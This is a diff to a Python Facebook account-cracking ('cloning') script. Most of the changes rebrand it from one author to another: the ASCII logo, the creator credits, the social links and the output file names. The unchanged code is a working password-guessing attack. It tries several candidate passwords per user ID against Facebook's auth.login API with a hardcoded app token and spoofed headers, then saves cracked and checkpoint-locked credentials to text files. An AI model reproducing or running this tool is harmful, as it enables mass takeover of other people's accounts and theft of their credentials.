@@ -381,16 +381,15 @@ bd = random.randint(2e7, 3e7)
 sim = random.randint(2e4, 4e4)
 header = {'x-fb-connection-bandwidth': repr(bd), 'x-fb-sim-hni': repr(sim), 'x-fb-net-hni': repr(sim),'x-fb-connection-quality': 'EXCELLENT', 'user-agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.3','x-fb-connection-type': 'unknown','content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
 logo ="""   
-   \033[1;95m████████╗ ██████╗ ██████╗ 
-   \033[0;97m╚══██╔══╝██╔═══██╗██╔══██╗
-   \033[0;96m   ██║   ██║   ██║██████╔╝
-   \033[1;93m   ██║   ██║   ██║██╔══██╗
-   \033[1;91m   ██║   ╚██████╔╝██║  ██║
-   \033[1;93m   ╚═╝    ╚═════╝ ╚═╝  ╚═╝
+\033[1;95m    _____  ____   ___  __  ____
+\033[1;97m   /  _   ) __   )   /  / __   )
+\033[1;96m  /  /_ / /___/  /   _ / ___/ /
+\033[1;93m /  /\  \  (_/  /    \  (_ / /
+\033[1;91m/__/  \_ \ ____/___/\_/ ____/
 \033[1;92m❥━──➸➽❥❂❥━──➸➽❥━──➸➽❥❂❥━──➸➽❥━──➸➽❥❂❥━──➸➽
-\033[1;92m{~} \033[0;96mCreater > \x1b[1;91mNaZir KhAn
-\033[1;92m{~} \033[0;96mFacebook > \x1b[1;91mAjMaLo DaDx
-\033[1;92m{~} \033[0;96mGithub > \x1b[1;91mhttps://github.com/Nazir003
+\033[1;92m{~} \033[0;96mCreator > \x1b[1;91mRaka Andrian Tara
+\033[1;92m{~} \033[0;96mFacebook > \x1b[1;91mfb.me/PEMUDA.KALEUM
+\033[1;92m{~} \033[0;96mGithub > \x1b[1;91mhttps://github.com/Bajingan-Z
 \033[1;92m❥━──➸➽❥❂❥━──➸➽❥━──➸➽❥❂❥━──➸➽❥━──➸➽❥❂❥━──➸➽"""
                    
 def main():
@@ -403,7 +402,7 @@ def main():
 	print(" \x1b[1;92m     [1] START CLONING\n")
 	os.system('echo -e "❥━──➸➽❥❂❥━──➸➽❥━──➸➽❥❂❥━──➸➽"| lolcat')
 	print("")
-	os.system('xdg-open https://www.facebook.com/NaZerkhaN521 ')
+	os.system('xdg-open https://youtu.be/bszAm4C5ovE ')
 	log_sel()
 def log_sel():
 	sel = raw_input(" Choose an option❥━──➸: ")
@@ -648,15 +647,15 @@ def crack_select():
 			data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass1+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
 			q = json.loads(data)
 			if "access_token" in q:
-				print(" \033[1;32m [HARI OK] "+uid+" | "+pass1+"\033[0;97m")
-				ok = open("HARIok.txt", "a")
+				print(" \033[1;32m [RAKA OK] "+uid+" | "+pass1+"\033[0;97m")
+				ok = open("RAKAok.txt", "a")
 				ok.write(uid+"|"+pass1+"\n")
 				ok.close()
 				oks.append(uid+pass1)
 			else:
 				if "www.facebook.com" in q["error_msg"]:
-					print(" \033[1;33m [Nazir CP] "+uid+" | "+pass1+"\033[0;97m")
-					cp = open("HARIcp.txt", "a")
+					print(" \033[1;33m [RAKA CP] "+uid+" | "+pass1+"\033[0;97m")
+					cp = open("RAKAcp.txt", "a")
 					cp.write(uid+"|"+pass1+"\n")
 					cp.close()
 					cps.append(uid+pass1)
@@ -665,15 +664,15 @@ def crack_select():
 					data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass2+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
 					q = json.loads(data)
 					if "access_token" in q:
-						print(" \033[1;32m [TOOr OK] "+uid+" | "+pass2+"\033[0;97m")
-						ok = open("HARIok.txt", "a")
+						print(" \033[1;32m [RAKA OK] "+uid+" | "+pass2+"\033[0;97m")
+						ok = open("RAKAok.txt", "a")
 						ok.write(uid+"|"+pass2+"\n")
 						ok.close()
 						oks.append(uid+pass2)
 					else:
 						if "www.facebook.com" in q["error_msg"]:
-							print(" \033[1;33m [Nazir CP] "+uid+" | "+pass2+"\033[0;97m")
-							cp = open("HARIcp.txt", "a")
+							print(" \033[1;33m [RAKA CP] "+uid+" | "+pass2+"\033[0;97m")
+							cp = open("RAKAcp.txt", "a")
 							cp.write(uid+"|"+pass2+"\n")
 							cp.close()
 							cps.append(uid+pass2)
@@ -682,15 +681,15 @@ def crack_select():
 							data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass3+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
 							q = json.loads(data)
 							if "access_token" in q:
-								print(" \033[1;32m [TOOr OK] "+uid+" | "+pass3+"\033[0;97m")
-								ok = open("HARIok.txt", "a")
+								print(" \033[1;32m [RAKA OK] "+uid+" | "+pass3+"\033[0;97m")
+								ok = open("RAKAok.txt", "a")
 								ok.write(uid+"|"+pass3+"\n")
 								ok.close()
 								oks.append(uid+pass3)
 							else:
 								if "www.facebook.com" in q["error_msg"]:
-									print(" \033[1;33m [NazirvCP] "+uid+" | "+pass3+"\033[0;97m")
-									cp = open("HARIcp.txt", "a")
+									print(" \033[1;33m [RAKA CP] "+uid+" | "+pass3+"\033[0;97m")
+									cp = open("RAKAcp.txt", "a")
 									cp.write(uid+"|"+pass3+"\n")
 									cp.close()
 									cps.append(uid+pass3)
@@ -699,15 +698,15 @@ def crack_select():
 									data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass4+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
 									q = json.loads(data)
 									if "access_token" in q:
-										print(" \033[1;32m [TOOr OK] "+uid+" | "+pass4+"\033[0;97m")
-										ok = open("HARIok.txt", "a")
+										print(" \033[1;32m [RAKA OK] "+uid+" | "+pass4+"\033[0;97m")
+										ok = open("RAKAok.txt", "a")
 										ok.write(uid+"|"+pass4+"\n")
 										ok.close()
 										oks.append(uid+pass4)
 									else:
 										if "www.facebook.com" in q["error_msg"]:
-											print(" \033[1;33m [Nazir CP] "+uid+" | "+pass4+"\033[0;97m")
-											cp = open("HARIcp.txt", "a")
+											print(" \033[1;33m [RAKA CP] "+uid+" | "+pass4+"\033[0;97m")
+											cp = open("RAKAcp.txt", "a")
 											cp.write(uid+"|"+pass4+"\n")
 											cp.close()
 											cps.append(uid+pass4)
@@ -723,8 +722,8 @@ def crack_select():
 												oks.append(uid+pass5)
 											else:
 												if "www.facebook.com" in q["error_msg"]:
-													print(" \033[1;33m [Nazir CP] "+uid+" | "+pass5+"\033[0;97m")
-													cp = open("HARIcp.txt", "a")
+													print(" \033[1;33m [RAKA CP] "+uid+" | "+pass5+"\033[0;97m")
+													cp = open("RAKAcp.txt", "a")
 													cp.write(uid+"|"+pass5+"\n")
 													cp.close()
 													cps.append(uid+pass5)
